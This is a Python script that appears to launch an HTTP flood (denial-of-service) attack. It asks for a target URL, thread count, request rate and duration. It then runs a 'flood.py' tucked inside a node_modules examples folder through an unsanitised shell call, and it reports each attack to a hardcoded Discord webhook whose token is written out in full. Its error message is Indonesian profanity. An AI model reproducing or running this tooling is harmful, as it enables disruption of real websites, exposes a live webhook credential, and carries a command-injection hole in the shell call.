import os
import requests
import json

def sendsocket(socket_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(socket_url, data=json.dumps(data), headers=headers)

socket_url = "https://discord.com/api/webhooks/1140253845591699507/obxJDX6hKCooDR5_hlW2CZZF3uWKURJMiz7D30YS1-dvKneWy9AdAEF1QxrgIPOMRwIX"

url = input("\nURL: ")
thread = input("Threads(1000+): ")
rpc = input("Rpc (1000+): ") 
time = input("Time: ") 
print("\n")

if url.strip() and thread.strip() and rpc.strip() and time.strip():
    flood = os.path.join("node_modules/randomstring/examples", "flood.py")
    os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
    sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\n\nThread: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\nFLOOD\n---------------\n‎ \n‎ \n‎ ")
else:
    print("Input tidak boleh kosong goblok lu memek tolol lu!")
